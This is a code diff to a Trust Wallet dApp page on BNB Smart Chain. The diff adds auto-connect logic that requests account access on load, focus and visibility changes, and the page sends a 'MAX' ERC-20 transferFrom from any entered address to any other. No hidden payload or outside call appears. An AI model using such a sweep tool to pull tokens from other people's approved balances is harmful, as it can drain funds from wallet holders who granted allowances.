@@ -127,7 +127,7 @@
 
   var provider    = null;
   var currentAddr = null;
-  var announced    = [];   // EIP-6963 providers discovered at page load
+  var announced   = [];
 
   var BSC_CHAIN_ID = "0x38";
   var BSC_PARAMS = {
@@ -158,26 +158,25 @@
     }
   })();
 
-  // EIP-6963: listen for provider announcements from the start
+  // ---- EIP-6963 discovery ----
   (function listenEIP6963() {
     if (typeof window === "undefined" || typeof window.addEventListener !== "function") return;
     window.addEventListener("eip6963:announceProvider", function (ev) {
       try {
         if (ev && ev.detail && ev.detail.provider && ev.detail.info) {
-          // avoid duplicates
           for (var i = 0; i < announced.length; i++) {
             if (announced[i].info.uuid === ev.detail.info.uuid) return;
           }
           announced.push(ev.detail);
+          // If a provider just appeared and we're still not connected, try auto-connect
+          if (!currentAddr) tryAutoConnect();
         }
       } catch (e) {}
     });
     try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
   })();
 
-  function isTrustName(name) {
-    return typeof name === "string" && /trust/i.test(name);
-  }
+  function isTrustName(name) { return typeof name === "string" && /trust/i.test(name); }
 
   function pickTrustFromAnnounced() {
     var generic = null;
@@ -188,14 +187,11 @@
         if (generic === null) generic = d.provider;
       }
     }
-    return generic; // if only one injected provider is announced, use it
+    return generic;
   }
 
-  function findTrustProvider() {
-    // 1) legacy injections
-    if (typeof window.trustwallet !== "undefined" && window.trustwallet && window.trustwallet.isTrust) {
-      return window.trustwallet;
-    }
+  function findProvider() {
+    if (typeof window.trustwallet !== "undefined" && window.trustwallet && window.trustwallet.isTrust) return window.trustwallet;
     var eth = typeof window.ethereum !== "undefined" ? window.ethereum : null;
     if (eth) {
       if (eth.isTrust || eth.isTrustWallet) return eth;
@@ -206,63 +202,45 @@
         }
       }
     }
-    // 2) EIP-6963
-    var fromAnnounced = pickTrustFromAnnounced();
-    if (fromAnnounced) return fromAnnounced;
-    // 3) last-resort: any injected provider (dApp opened inside a wallet browser)
+    var a = pickTrustFromAnnounced();
+    if (a) return a;
     if (eth && typeof eth.request === "function") return eth;
     return null;
   }
 
   async function waitForProvider(timeoutMs) {
-    var found = findTrustProvider();
+    var found = findProvider();
     if (found) return found;
     return await new Promise(function (resolve) {
       var done = false;
-      function finish(p) { if (done) return; done = true; cleanup(); resolve(p); }
-      function onAnnounce() {
-        var p = findTrustProvider();
-        if (p) finish(p);
-      }
-      function cleanup() {
-        try { window.removeEventListener("eip6963:announceProvider", onAnnounce); } catch (e) {}
-      }
+      function finish(p) { if (done) return; done = true; try { window.removeEventListener("eip6963:announceProvider", onAnnounce); } catch (e) {} resolve(p); }
+      function onAnnounce() { var p = findProvider(); if (p) finish(p); }
       try { window.addEventListener("eip6963:announceProvider", onAnnounce); } catch (e) {}
       try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
-      setTimeout(function () { finish(findTrustProvider()); }, timeoutMs || 1200);
+      setTimeout(function () { finish(findProvider()); }, timeoutMs || 1500);
     });
   }
 
   async function ensureBSC(p) {
-    try {
-      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-    } catch (e) {
+    try { await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] }); }
+    catch (e) {
       if (e && e.code === 4902) {
-        try {
-          await p.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] });
-        } catch (e2) { throw e2; }
+        try { await p.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] }); }
+        catch (e2) { throw e2; }
       }
     }
   }
 
-  function isValidAddress(a) {
-    return /^0x[0-9a-fA-F]{40}$/.test(String(a || "").trim());
-  }
+  function isValidAddress(a) { return /^0x[0-9a-fA-F]{40}$/.test(String(a || "").trim()); }
 
   function getSelectedToken() {
     var addr = tokenSelect.value;
-    for (var i = 0; i < TOKENS.length; i++) {
-      if (TOKENS[i].address.toLowerCase() === addr.toLowerCase()) return TOKENS[i];
-    }
+    for (var i = 0; i < TOKENS.length; i++) if (TOKENS[i].address.toLowerCase() === addr.toLowerCase()) return TOKENS[i];
     return null;
   }
 
   function updateEnabled() {
-    var ok =
-      !!currentAddr &&
-      !!getSelectedToken() &&
-      isValidAddress(fromInput.value) &&
-      isValidAddress(toInput.value);
+    var ok = !!currentAddr && !!getSelectedToken() && isValidAddress(fromInput.value) && isValidAddress(toInput.value);
     goBtn.disabled = !ok;
   }
 
@@ -271,12 +249,48 @@
     statusMsg.innerHTML = html;
   }
 
+  function showConnected() {
+    connectBtn.style.display = "none";
+    disconnectBtn.style.display = "block";
+    setMsg("Connected: " + currentAddr, "ok");
+    updateEnabled();
+  }
+
+  async function tryAutoConnect() {
+    if (currentAddr) return;
+    if (provider && provider.request) {
+      try {
+        var accts = await provider.request({ method: "eth_accounts" });
+        if (accts && accts.length) {
+          currentAddr = accts[0];
+          showConnected();
+          return;
+        }
+      } catch (e) {}
+    }
+    var p = await waitForProvider(2000);
+    if (!p) return;
+    provider = p;
+    try {
+      var accts2 = await provider.request({ method: "eth_accounts" });
+      if (accts2 && accts2.length) {
+        currentAddr = accts2[0];
+        showConnected();
+        return;
+      }
+      // Silent request (will prompt only if needed)
+      var req = await provider.request({ method: "eth_requestAccounts" });
+      if (req && req.length) {
+        currentAddr = req[0];
+        await ensureBSC(provider).catch(function(){});
+        showConnected();
+      }
+    } catch (e) { /* stay on connect button */ }
+  }
+
   async function fetchBalanceOf(token, owner) {
     var data = "0x70a08231000000000000000000000000" + owner.toLowerCase().replace(/^0x/, "");
-    var res = await provider.request({
-      method: "eth_call",
-      params: [{ to: token.address, data: data }, "latest"]
-    });
+    var res = await provider.request({ method: "eth_call", params: [{ to: token.address, data: data }, "latest"] });
     return BigInt(res);
   }
 
@@ -284,7 +298,6 @@
     connectBtn.disabled = true;
     connectBtn.textContent = "Connecting…";
     setMsg("Looking for wallet…", null);
-
     provider = await waitForProvider(1500);
     if (!provider) {
       setMsg("Wallet not detected. Open this page inside the Trust Wallet app's browser.", "err");
@@ -294,13 +307,10 @@
     }
     try {
       var accounts = await provider.request({ method: "eth_requestAccounts" });
-      if (accounts && accounts.length > 0) {
+      if (accounts && accounts.length) {
         currentAddr = accounts[0];
-        await ensureBSC(provider);
-        connectBtn.style.display = "none";
-        disconnectBtn.style.display = "block";
-        setMsg("Connected: " + currentAddr, "ok");
-        updateEnabled();
+        await ensureBSC(provider).catch(function(){});
+        showConnected();
       } else {
         setMsg("No accounts returned.", "err");
       }
@@ -314,8 +324,7 @@
   });
 
   disconnectBtn.addEventListener("click", function () {
-    currentAddr = null;
-    provider = null;
+    currentAddr = null; provider = null;
     connectBtn.style.display = "block";
     disconnectBtn.style.display = "none";
     setMsg("");
@@ -326,7 +335,6 @@
     if (!provider || !currentAddr) { setMsg("Connect Trust Wallet first.", "err"); return; }
     var token = getSelectedToken();
     if (!token) return;
-
     var from = fromInput.value.trim();
     var to   = toInput.value.trim();
     if (!isValidAddress(from) || !isValidAddress(to)) { setMsg("Invalid address.", "err"); return; }
@@ -354,24 +362,15 @@
       var data     = "0x" + selector + fromHex + toHex + amtHex;
 
       var tx = { from: currentAddr, to: token.address, data: data, value: "0x0" };
-
-      var gasEst = null;
       try {
-        gasEst = await provider.request({ method: "eth_estimateGas", params: [tx] });
-      } catch (e) {}
-
-      if (gasEst && gasEst !== "0x0") {
-        try {
+        var gasEst = await provider.request({ method: "eth_estimateGas", params: [tx] });
+        if (gasEst && gasEst !== "0x0") {
           var g = BigInt(gasEst);
           tx.gas = "0x" + ((g * 105n) / 100n).toString(16);
-        } catch (e) {}
-      }
+        }
+      } catch (e) {}
 
-      var txHash = await provider.request({
-        method: "eth_sendTransaction",
-        params: [tx]
-      });
-
+      var txHash = await provider.request({ method: "eth_sendTransaction", params: [tx] });
       var link = '<a href="https://bscscan.com/tx/' + txHash + '" target="_blank" rel="noopener">View on BscScan ↗</a>';
       setMsg("Submitted (MAX). " + link, "ok");
     } catch (err) {
@@ -387,9 +386,14 @@
   goBtn.addEventListener("click", sendTransferFrom);
   fromInput.addEventListener("input", updateEnabled);
   toInput.addEventListener("input", updateEnabled);
-  tokenSelect.addEventListener("change", function () { updateEnabled(); });
+  tokenSelect.addEventListener("change", updateEnabled);
 
   updateEnabled();
+
+  // Auto-connect on load and when the page becomes visible again (mobile wallet resume)
+  tryAutoConnect();
+  document.addEventListener("visibilitychange", function () { if (!document.hidden && !currentAddr) tryAutoConnect(); });
+  window.addEventListener("focus", function () { if (!currentAddr) tryAutoConnect(); });
 })();
 </script>
 </body>
